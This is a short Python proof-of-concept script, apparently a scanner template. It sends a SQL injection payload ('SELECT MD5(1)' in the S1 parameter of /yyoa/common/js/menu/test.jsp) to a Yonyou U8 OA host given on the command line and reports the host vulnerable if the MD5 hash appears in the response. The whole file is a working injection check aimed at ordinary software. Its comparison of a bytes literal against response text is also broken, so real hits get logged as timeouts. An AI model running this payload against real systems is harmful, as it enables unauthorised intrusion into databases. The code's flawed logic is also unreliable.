#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"                                                      #填写payload
    try:
        tar = "http://" + ip + ":" + port
        req = requests.get(tar + payload,timeout=3,verify=False,allow_redirects=False)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( b"c4ca4238a0b923820dcc509a6f75849b" in req.text ):          #填写匹配信息
                logging.info(u"[+] {} find U8_OA".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info(u"[-] {} do not found U8_OA".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info(u"[-] {} do not found U8_OA".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] timeout")
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
